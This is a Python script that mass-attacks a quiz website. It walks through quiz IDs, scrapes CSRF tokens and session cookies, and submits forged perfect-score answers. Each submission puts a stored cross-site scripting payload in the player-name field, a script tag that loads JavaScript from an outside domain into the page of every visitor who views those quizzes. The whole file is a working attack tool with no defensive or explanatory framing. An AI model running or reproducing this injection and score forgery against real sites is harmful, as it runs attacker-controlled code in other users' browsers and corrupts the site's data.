from fake_headers import Headers
import requests
from colorama import init, Fore, Style
from time import sleep
import os
import re

init(convert=True)
init(autoreset=True)

bright = Style.BRIGHT
dim = Style.DIM
red = Fore.RED + bright + dim
green = Fore.GREEN + bright + dim
cyan = Fore.CYAN + bright + dim
yellow = Fore.LIGHTYELLOW_EX + bright + dim
blue = Fore.BLUE + bright + dim
magenta = Fore.MAGENTA + bright + dim

ROOT_URL = "https://q.fun-dare.com/"
INITIAL_QUIZ = "31949508"
QUIZ_SCORE = "111"
QUIZ_NAME = "nothing_to_see_here"
SCRIPT_URL = "https://fun-daree.click/harlem_shake.js"

INJECT_XSS = (QUIZ_NAME + "<script src='" + SCRIPT_URL + "'></script>").replace('\n','')

def main():
    os.system("cls")

    initial_url = ROOT_URL + "es/d/" + INITIAL_QUIZ

    print("{}Loaded XSS script {}{}".format(cyan, blue, INJECT_XSS))
    print("{}Initial quiz {}{}".format(cyan, blue, initial_url))

    count = 0
    while True:
        count += 18
        curr_quiz_id = str(int(INITIAL_QUIZ) + count)
        curr_url = ROOT_URL + "es/d/" + curr_quiz_id
        headers = Headers(headers=True).generate()
        initial_get = requests.get(curr_url, headers=headers)

        initial_cookies = {
            'XSRF-TOKEN': initial_get.cookies["XSRF-TOKEN"],
            'fundare_session': initial_get.cookies["fundare_session"],
            '_ga': 'GA1.2.1228194333.1637572647',
            '_gid': 'GA1.2.1932900930.1637572647',
            '__gads': 'ID=65c0ee9952ba8549-221b38f1bfce0012:T=1637572647:RT=1637572647:S=ALNI_MaZoPbdoNND90ckrsnH_FcpaozimQ',
            '__atuvc': '5%7C47',
            '__atuvs': '619b602791aa47d3004',
            'player_name': QUIZ_NAME,
            'answerdone_' + curr_quiz_id: QUIZ_SCORE,
            'score_' + curr_quiz_id: QUIZ_SCORE
        }

        try:
            x_csrf_token = re.search(r'<meta name=\"csrf-token\" content=\"(.*?)\">', initial_get.text).group(1)
        except:
            print(red + "Error finding CSRF token")

        post_data = {"qdata": "{\"qid\":\"" + curr_quiz_id + "\",\"pname\":\"" + INJECT_XSS + "\",\"score\":" + QUIZ_SCORE + ",\"answerData\":[{\"qId\":1814,\"ans\":5963,\"actualAns\":5963},{\"qId\":1828,\"ans\":6036,\"actualAns\":6036},{\"qId\":1824,\"ans\":6016,\"actualAns\":6016},{\"qId\":1831,\"ans\":6050,\"actualAns\":6050},{\"qId\":1827,\"ans\":6030,\"actualAns\":6030},{\"qId\":1820,\"ans\":5994,\"actualAns\":5994},{\"qId\":1821,\"ans\":6002,\"actualAns\":6002},{\"qId\":1832,\"ans\":6055,\"actualAns\":6055},{\"qId\":1830,\"ans\":6044,\"actualAns\":6044},{\"qId\":1837,\"ans\":6077,\"actualAns\":6077},{\"qId\":1815,\"ans\":5969,\"actualAns\":5969},{\"qId\":1819,\"ans\":5992,\"actualAns\":5992},{\"qId\":1834,\"ans\":6065,\"actualAns\":6065},{\"qId\":1826,\"ans\":6026,\"actualAns\":6026},{\"qId\":1818,\"ans\":5986,\"actualAns\":5986}]}"}
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                   'Accept': 'application/json, text/javascript, */*; q=0.01',
                   'Accept-Language': 'en-US,en;q=0.5',
                   'Accept-Encoding': 'gzip, deflate',
                   'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                   'X-Csrf-Token': x_csrf_token,
                   'X-Requested-With': 'XMLHttpRequest',
                   'Origin': 'https://q.fun-dare.com',
                   'Referer': curr_url,
                   'Te': 'trailers'}

        submit_answer = requests.post(ROOT_URL + "/submit", headers=headers, cookies=initial_cookies, data=post_data)

        if "{\"success\":\"true\"}" in submit_answer.text:
            print("{}Successfully injected script into quiz [{}{}{}]".format(green, yellow, curr_url, green))
        else:
            print("{}An error happened when trying to inject the script into quiz [{}{}{}]".format(red, yellow, curr_url, red))
            print(submit_answer.text)
            print(submit_answer.status_code)


main()
